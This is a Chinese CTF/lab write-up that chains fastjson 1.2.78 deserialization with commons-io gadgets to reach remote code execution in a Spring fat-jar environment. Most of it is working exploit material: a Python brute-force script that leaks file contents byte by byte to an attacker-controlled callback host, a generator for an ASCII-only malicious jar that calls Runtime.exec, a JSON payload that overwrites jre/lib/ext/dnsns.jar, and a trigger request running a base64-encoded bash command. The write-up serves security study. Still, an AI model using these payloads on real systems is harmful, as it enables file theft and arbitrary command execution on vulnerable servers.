# 背景及利用流程：

之前测的一个docker环境，fastjson1.2.78版本，commons-io2.2版本。

调试docker运行环境发现fastjson反序列化io链在创建WriterOutputStream实例的时候会调用「需要decoder参数的构造函数」，会导致公开的链子报空指针异常


![](https://files.mdnice.com/user/114427/79dfcb54-7e24-4e6e-8660-21e47c583106.png)


在processInput中，会调用this.decoder（为null）的decode方法，故而出现异常


![](https://files.mdnice.com/user/114427/b8f6f310-d823-4aa8-bcb8-0d1e19493ff6.png)


但是fastjson反序列化中，对象是从内层到外层依次创建的，所以LockableFileWriter是在WriterOutputStream之前处理的，所以还是会创建一个带锁的空文件：


![](https://files.mdnice.com/user/114427/17901bc8-615e-4c3a-bb79-234993aca8aa.png)


奇怪的是，同样的代码在我的Mac IDEA中直接运行是不会出现这个问题的，测试如下：

```json
"branch": {
"@type":"org.apache.commons.io.output.WriterOutputStream",
"writer":{
"@type":"org.apache.commons.io.output.FileWriterWithEncoding",
"file":"/tmp/bbb",
"encoding":"iso-8859-1",
"append": false
},
"charsetName": "iso-8859-1",
"bufferSize": 8193,
"writeImmediately": true
},
```

实例化WriterOutputStream时会依次调用3个构造函数，并且最终的decoder不为null


![](https://files.mdnice.com/user/114427/bccaa74f-fdbb-4daf-ac4b-b9b864ceacad.png)



![](https://files.mdnice.com/user/114427/b565665d-ab84-4931-9347-78ee81713890.png)


可以看到首先调用的是`public WriterOutputStream(Writer writer, String charsetName, int bufferSize, boolean writeImmediately)`，会根据charsetName传入的字符串，自动创建decoder对象。

docker和mac idea运行环境为什么会出现这种差异具体原因未知，怀疑是不同jdk发行版的原因。

**在@pen4uin一番研究后，发现可以用fastjson自带的“com.alibaba.fastjson.util.UTF8Decoder”填充decoder参数。**

解决办法就是给WriterOutputStream设置上decoder：

即，添加字段：`"decoder":{"@type":"com.alibaba.fastjson.util.UTF8Decoder"}`

问题变成spring fat jar写文件的利用：

-   计划任务
-   ssh
-   charsets.jar
-   tomcat docbase
-   ...

前两个在目标环境都是没有的。且无论是.class还是.jar都有非UTF-8字符，而我们用的是UTF8Decoder，会出错，这样@jsjcw在geekcon2024公开的「往${docbase}/WEB-INF/classes/路径下写入恶意类」的利用方法就不能直接拿来用了。

**好在@c0ny1之前研究过如何生成ascii jar。我们还是能做到稳定写一个jar文件。**

目标环境中charset.jar被提前加载了，覆盖charset.jar的方法行不通。

**@pen4uin告知lib/ext下面还能用dnsns.jar，目标环境中未被加载，可行**。

下面的演示步骤用到了@kezibei的一个爆破路径的脚本是要出网，但不需要出网也能爆破路径，整个流程中可以不出网利用。

**由于提供了docker环境所以做这个题目不需要爆破路径也行，实际攻防场景可能需要爆破目录**

# 利用步骤：

1、添加InputStream到缓存，然后爆破路径（docbase、jre）

-   爆破docbase是写class的利用；

-   或者根据dockerfile的描述，自己进入容器找jre/lib/ext的绝对路径，写jar去利用。

```python
#python3

from flask import Flask, request
import requests
import base64
import time

requests.packages.urllib3.disable_warnings()
app=Flask(__name__)



url = "http://127.0.0.1:8089/json"
host = "172.16.12.1"
port = 5667
read_file = "file:///usr/lib/jvm/"


header = '''
Host: 127.0.0.1
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
'''

json1 = r'''
{
  "a": "{    \"@type\": \"java.lang.Exception\",    \"@type\": \"com.fasterxml.jackson.core.JsonParseException\",    \"p\": {    }  }",
  "b": {
    "$ref": "$.a.a"
  },
  "c": "{  \"@type\": \"com.fasterxml.jackson.core.JsonParser\",  \"@type\": \"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\",  \"in\": {}}",
  "d": {
    "$ref": "$.c.c"
  },
}
'''

json2 = r'''
{
  "su18": {
  "@type": "java.io.InputStream",
  "@type": "org.apache.commons.io.input.BOMInputStream",
  "delegate": {
    "@type": "org.apache.commons.io.input.ReaderInputStream",
    "reader": {
        "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": {
                "@type": "java.lang.String" {
                "@type": "java.util.Locale",
                "val": {
                "@type": "com.alibaba.fastjson.JSONObject",
                        {
                        "@type": "java.lang.String"
                        "@type": "java.util.Locale",
                        "language": "http://${host}:${port}/?test=",
                        "country": {"@type": "java.lang.String" [
                        
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "${read_file}"
        },
        "charsetName": "UTF-8",
        "bufferSize": "1024"
      },
      "boms": [
        {
          "charsetName": "UTF-8",
          "bytes": [${bytes}]
        }
      ]
}
                        ]
            }
        }
    },
        "charsetName": "UTF-8",
        "bufferSize": 1024
  },
  "boms": [
   {
    "@type": "org.apache.commons.io.ByteOrderMark",
    "charsetName": "UTF-8",
    "bytes": [
     36,
     82
    ]
   }
  ]
 },
 "su19": {
  "$ref": "$.su18.bOM.bytes"
 }
}
'''.replace('${host}', host).replace('${port}', str(port)).replace('${read_file}', read_file)

hava_bytes = False




def get_brute_list():
    recommended = (list(range(97, 123)) + list(range(48, 58)) + [10, 45, 46, 95] + list(range(65, 91)) )
    recommended_set = set(recommended)
    all_ascii = set(range(256))
    others = sorted(all_ascii - recommended_set)
    brute_list = recommended + others
    brute_list.append(256)
    print(brute_list)
    return brute_list



def parse_raw_headers(raw_headers):
    exclude_keys = {'host', 'content-Length'}
    headers = {}
    for line in raw_headers.strip().splitlines():
        if ':' in line:
            key, value = line.split(':', 1)
            key_clean = key.strip()
            if key_clean.lower() not in exclude_keys:
                headers[key_clean] = value.strip()
    return headers

def burp():
    global hava_bytes
    global url
    global header
    global json2
    
    brute_list = get_brute_list()
    bytes = ''
    file_contents = ''
    
    for i in range(1,100000):
        for b in brute_list:
            if b == 256:
                print(file_contents)
                print("file_contents长度: "+str(len(file_contents)))
                return
            bytes_tmp = bytes + str(b)+','
            data = json2.replace('${bytes}', bytes_tmp)
            flag_tmp = file_contents + chr(b)
            r = requests.post(url, data=data, headers=parse_raw_headers(header), verify=False,timeout=10)
            #print(data)
            #print(flag_tmp)
            #print(bytes_tmp)
            if hava_bytes:
                bytes = bytes + str(b)+','
                file_contents = file_contents + chr(b)
                print(file_contents)
                hava_bytes = False
                break


@app.route('/')
def default():
    global hava_bytes
    s = request.args.get('test')
    if 'BYTES' in s :
        hava_bytes = True
        return 'ok'
    else:
        return 'no'

@app.route('/run')
def run():
    r1 = requests.post(url, data=json1, headers=parse_raw_headers(header), verify=False)
    print("start\n")
    print(r1.text)
    start = time.time()
    burp()
    end = time.time()
    time_str = f"耗时：{end - start:.4f} 秒"
    print(time_str)
    return 'ok ' + time_str

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=port)
```

2、构造恶意的ascii jar

```python
#!/usr/bin/env python
# autor: c0ny1
# date 2022-02-13
from __future__ import print_function

import time
import os
from compress import *

allow_bytes = []
disallowed_bytes = [38,60,39,62,34,40,41] # &<'>"()
for b in range(0,128): # ASCII
    if b in disallowed_bytes:
        continue
    allow_bytes.append(b)


if __name__ == '__main__':
    padding_char = 'U'
    raw_filename = 'DNSNameServiceDescriptor.class'
    zip_entity_filename = 'sun/net/spi/nameservice/dns/DNSNameServiceDescriptor.class'
    jar_filename = 'ascii01_3.jar'
    num = 1
    while True:
        # step1 动态生成java代码并编译
        javaCode = """
package sun.net.spi.nameservice.dns;
import sun.net.spi.nameservice.NameService;
import sun.net.spi.nameservice.NameServiceDescriptor;

import java.io.IOException;

public final class DNSNameServiceDescriptor extends Exception implements NameServiceDescriptor {
    private static final String paddingData = "{PADDING_DATA}";
    public DNSNameServiceDescriptor(String message) {
        try {
            Runtime.getRuntime().exec(message);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public NameService createNameService() throws Exception {
        return null;
    }

    public String getProviderName() {
        return "sun";
    }

    public String getType() {
        return "dns";
    }
}
                """
        padding_data = padding_char * num
        javaCode = javaCode.replace("{PADDING_DATA}", padding_data)

        f = open('DNSNameServiceDescriptor.java', 'w')
        f.write(javaCode)
        f.close()
        time.sleep(0.1)

        os.system("/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/javac -nowarn -g:none -source 1.8 -target 1.8 -cp jasper.jar  DNSNameServiceDescriptor.java")
        time.sleep(0.1)

        # step02 计算压缩之后的各个部分是否在允许的ASCII范围
        raw_data = bytearray(open(raw_filename, 'rb').read())
        compressor = ASCIICompressor(bytearray(allow_bytes))
        compressed_data = compressor.compress(raw_data)[0]
        crc = zlib.crc32(raw_data) % pow(2, 32)

        st_crc = struct.pack('<L', crc)
        st_raw_data = struct.pack('<L', len(raw_data) % pow(2, 32))
        st_compressed_data = struct.pack('<L', len(compressed_data) % pow(2, 32))
        st_cdzf = struct.pack('<L', len(compressed_data) + len(zip_entity_filename) + 0x1e)


        b_crc = isAllowBytes(st_crc, allow_bytes)
        b_raw_data = isAllowBytes(st_raw_data, allow_bytes)
        b_compressed_data = isAllowBytes(st_compressed_data, allow_bytes)
        b_cdzf = isAllowBytes(st_cdzf, allow_bytes)

        # step03 判断各个部分是否符在允许字节范围
        if b_crc and b_raw_data and b_compressed_data and b_cdzf:
            print('[+] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))
            # step04 保存最终ascii jar
            output = open(jar_filename, 'wb')
            output.write(wrap_jar(raw_data,compressed_data, zip_entity_filename.encode()))
            print('[+] Generate {0} success'.format(jar_filename))
            break
        else:
            print('[-] CRC:{0} RDL:{1} CDL:{2} CDAFL:{3} Padding data: {4}*{5}'.format(b_crc, b_raw_data,
                                                                                       b_compressed_data, b_cdzf, num,
                                                                                       padding_char))
        num = num + 1
```

3、写入恶意jar，替换dnsns.jar

```http
POST /json HTTP/1.1
Content-Type: application/json
Host: 127.0.0.1:8089

{
  "a": {
    "@type": "java.io.InputStream",
    "@type": "org.apache.commons.io.input.AutoCloseInputStream",
    "in": {
      "@type": "org.apache.commons.io.input.TeeInputStream",
      "input": {
        "@type": "org.apache.commons.io.input.CharSequenceInputStream",
        "s": {
          "@type": "java.lang.String"
          "jar hex",
          "charset": "iso-8859-1",
          "bufferSize": 8032
        },
        "branch": {
          "@type":"org.apache.commons.io.output.WriterOutputStream",
          "writer":{
          "@type":"org.apache.commons.io.output.LockableFileWriter",
          "file":"/usr/local/openjdk-8/jre/lib/ext/dnsns.jar",
          "encoding":"UTF-8",
          "append": false
          },
          "decoder":{"@type":"com.alibaba.fastjson.util.UTF8Decoder"},
          "bufferSize": 8193,
          "writeImmediately": true
        },
        "closeBranch": true
      }
    },
    "b": {
      "@type": "java.io.InputStream",
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "is": {
          "$ref": "$.a"
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "iso-8859-1"
      },
      "charsetName": "iso-8859-1",
      "bufferSize": 1024
    },
    "c": {
      "@type": "java.io.InputStream",
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "is": {
          "$ref": "$.a"
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "iso-8859-1"
      },
      "charsetName": "iso-8859-1",
      "bufferSize": 1024
    },
    "d": {
      "@type": "java.io.InputStream",
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "is": {
          "$ref": "$.a"
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "iso-8859-1"
      },
      "charsetName": "iso-8859-1",
      "bufferSize": 1024
    },
    "e": {
      "@type": "java.io.InputStream",
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "is": {
          "$ref": "$.a"
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "iso-8859-1"
      },
      "charsetName": "iso-8859-1",
      "bufferSize": 1024
    },
  }
```


4、触发恶意jar，执行命令「id > /tmp/hhh」

```http
POST /json HTTP/1.1
Content-Type: application/json
Host: 127.0.0.1:8089

{
  "@type": "java.lang.Exception",
  "@type": "sun.net.spi.nameservice.dns.DNSNameServiceDescriptor",
  "message": "bash -c {echo,aWQgPiAvdG1wL2hoaA==}|{base64,-d}|{bash,-i}"
}
```



# 其他

jdk太低的版本不行，比如8u102，ext目录下的jar不能被fastjson加载。

作者这里使用的替换dnsns.jar来进行利用实际上还有其他jar可以利用，比如大部分预期解的师傅采用的是覆盖nashorn.jar。

我们可以在启动java时添加-verbose:class参数查看哪些jar被加载了，然后找到未被加载的去覆盖利用。
